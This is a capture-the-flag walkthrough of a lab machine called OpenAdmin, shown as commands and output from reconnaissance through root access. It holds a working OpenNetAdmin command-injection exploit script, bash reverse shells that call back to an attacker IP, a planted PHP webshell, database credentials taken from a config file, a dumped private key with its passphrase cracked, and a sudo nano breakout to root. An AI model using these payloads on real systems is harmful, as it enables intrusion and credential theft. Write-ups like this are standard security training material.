# Reconnaissance
`$ nmap -p- -sV -sC -oA nmap/scripts 10.10.10.171 -Pn`
```
Nmap scan report for 10.10.10.171
Host is up (0.053s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.45 seconds

```

## Port 80
`$ gobuster dir -u http://10.10.10.171 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php,txt,html -o scans/gobuster-root-php_txt_html`
```
/.html        (Status: 403) [Size: 277]
/index.html   (Status: 200) [Size: 10918]
/.php         (Status: 403) [Size: 277]
/music        (Status: 301) [Size: 312] [--> http://10.10.10.171/music/]
/artwork      (Status: 301) [Size: 314] [--> http://10.10.10.171/artwork/]
/.php         (Status: 403) [Size: 277]
/.html        (Status: 403) [Size: 277]
/sierra       (Status: 301) [Size: 313] [--> http://10.10.10.171/sierra/]                                                                                     
```

**Note**: Login button in /music page is direct to http://10.10.10.171/ona/ (OpenNetAdmin v18.1.1)


# Pre-Exploitation
## Looking at OpenNetAdmin
`$ searchsploit opennetadmin`
```
-------------------------------------------------------------------------------------- ---------------------------------

 Exploit Title                                                                        |  Path

-------------------------------------------------------------------------------------- ---------------------------------

**OpenNetAdmin** 13.03.01 - Remote Code Execution                                         | php/webapps/26682.txt

**OpenNetAdmin** 18.1.1 - Command Injection Exploit (Metasploit)                          | php/webapps/47772.rb

**OpenNetAdmin** 18.1.1 - Remote Code Execution                                           | php/webapps/47691.sh

-------------------------------------------------------------------------------------- ---------------------------------

Shellcodes: No Results
```

`cat /usr/share/exploitdb/exploits/php/webapps/47691.sh`
```
#!/bin/bash

URL="${1}"
while true;do
 echo -n "$ "; read cmd
 curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done                  
```


# Exploitation
## OpenNetAdmin
`$ ./47691.sh http://10.10.10.171/ona/`
```
$ ifconfig
ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.10.171  netmask 255.255.255.0  broadcast 10.10.10.255
        inet6 fe80::250:56ff:feb9:4560  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:45:60  txqueuelen 1000  (Ethernet)
        RX packets 453815  bytes 66614391 (66.6 MB)
        RX errors 0  dropped 29  overruns 0  frame 0
        TX packets 450398  bytes 188929517 (188.9 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2573  bytes 198753 (198.7 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2573  bytes 198753 (198.7 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Interactive Shell
`$ curl -s -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;bash -c 'bash -i >%26 /dev/tcp/10.10.16.12/443 0>%261'&xajaxargs[]=ping" http://10.10.10.171/ona/`

**Listening** 
```
$ nc -lnvp 443        
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.171] 57610
bash: cannot set terminal process group (1210): Inappropriate ioctl for device
bash: no job control in this shell
www-data@openadmin:/opt/ona/www$ 
```
# Post-Exploitation

## Enumeration
### User enumeration
```
www-data@openadmin:/opt/ona/www$ cd /home/
cd /home/
www-data@openadmin:/home$ find .
find .
.
./jimmy
find: './jimmy': Permission denied
./joanna
find: './joanna': Permission denied
www-data@openadmin:/home$ 
```

### Config enumeration
`$ cat /var/www/html/ona/local/config/database_settings.inc.php`
```
<www/html/ona/local/config/database_settings.inc.php
<?php

$ona_contexts=array (
  'DEFAULT' => 
  array (
    'databases' => 
    array (
      0 => 
      array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => 'n1nj4W4rri0R!',
        'db_database' => 'ona_default',
        'db_debug' => false,
      ),
    ),
    'description' => 'Default data context',
    'context_color' => '#D3DBFF',
  ),
);

?>
```

### SSH Login
`$ ssh jimmy@10.10.10.171` | password **n1nj4W4rri0R!**

## Lateral Movement
### Privilege: Jimmy to Joanna
`$ cat /etc/apache2/sites-enabled/internal.conf`
```
Listen 127.0.0.1:52846

<VirtualHost 127.0.0.1:52846>
    ServerName internal.openadmin.htb
    DocumentRoot /var/www/internal

<IfModule mpm_itk_module>
AssignUserID joanna joanna
</IfModule>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

#### Tunneling to port 52846
`$ ssh jimmy@10.10.10.171 -L 52846:localhost:52846`

**Add Webshell to internal website**
`$ echo '<?php system($_GET["cmd"]); ?>' > /var/www/internal/cmd.php`

**Access the webshell**
`curl http://127.0.0.1:52846/cmd.php?cmd=id`
```
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
```

### Reverse Shell
`$ curl 'http://127.0.0.1:52846/cmd.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.16.12/443%200%3E%261%27'`
```
 nc -lnvp 443        
listening on [any] 443 ...
connect to [10.10.16.12] from (UNKNOWN) [10.10.10.171] 58586
bash: cannot set terminal process group (1210): Inappropriate ioctl for device
bash: no job control in this shell
joanna@openadmin:/var/www/internal$ id
id
uid=1001(joanna) gid=1001(joanna) groups=1001(joanna),1002(internal)
joanna@openadmin:/var/www/internal$
```

**Got SSH Key of Joanna**
```
joanna@openadmin:/var/www/internal$ ls
ls
cmd.php
index.php
logout.php
main.php
joanna@openadmin:/var/www/internal$ cat main.php
cat main.php
<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo "<pre>$output</pre>";
?>
<html>
<h3>Don't forget your "ninja" password</h3>
Click here to logout <a href="logout.php" tite = "Logout">Session
</html>
joanna@openadmin:/var/www/internal$ file /home/joanna/.ssh/id_rsa
file /home/joanna/.ssh/id_rsa
/home/joanna/.ssh/id_rsa: PEM RSA private key
joanna@openadmin:/var/www/internal$ 
```

**Download it**
```
joanna@openadmin:/var/www/internal$ cat /home/joanna/.ssh/id_rsa
cat /home/joanna/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
joanna@openadmin:/var/www/internal$
```
```
$ openssl rsa -in joanna_key -out joanna_test             
Enter pass phrase for joanna_key:
Could not read private key from joanna_key
4077EFF7FF7F0000:error:1C800064:Provider routines:ossl_cipher_unpadblock:bad decrypt:../providers/implementations/ciphers/ciphercommon_block.c:124:
4077EFF7FF7F0000:error:04800065:PEM routines:PEM_do_header:bad decrypt:../crypto/pem/pem_lib.c:467:
```

### Bruteforce Password SSH Key
`$ ssh2john joanna_key > joanna.john `
`$ john --wordlist=/usr/share/wordlists/rockyou.txt joanna.john`
```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
bloodninjas      (joanna_key)     
1g 0:00:00:00 DONE (2023-12-26 04:11) 25.00g/s 37600p/s 37600c/s 37600C/s bninja95..badassninja
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

### SSH to Joanna
`$ ssh -i joanna_key joanna@10.10.10.171`
```
Enter passphrase for key 'joanna_key': 
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue Dec 26 09:15:22 UTC 2023

  System load:  0.0               Processes:             175
  Usage of /:   31.5% of 7.81GB   Users logged in:       1
  Memory usage: 11%               IP address for ens160: 10.10.10.171
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

39 packages can be updated.
11 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jul 27 06:12:07 2021 from 10.10.14.15
joanna@openadmin:~$ ls
user.txt
joanna@openadmin:~$ cat user.txt 
aae4928a4fa17a0e99b4b9c5a3d3a23c
joanna@openadmin:~$ 
```


### Privilege: Joanna ot Root
`$ sudo -l`
```
Matching Defaults entries for joanna on openadmin:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```
`$ ls -al /opt/priv`
```
-rw-r--r-- 1 root root 0 Nov 22  2019 /opt/priv
```

`$ sudo /bin/nano /opt/priv`
then `Ctrl + r` also `Ctrl + x`
```
reset; /bin/sh 1>&0 2>&0 #id
```
```
Command to execute: reset; /bin/sh 1>&0 2>&0 #id# id                                                                                                                        
uid=0(root) gid=0(root) groups=0(root)                                                ^X Read File
# ls /root/                                                                           M-F New Buffer
root.txt
# cat /root/root.txt
f4df8672fcd5ad1d8ae77377d9fe3a6f
# 
```

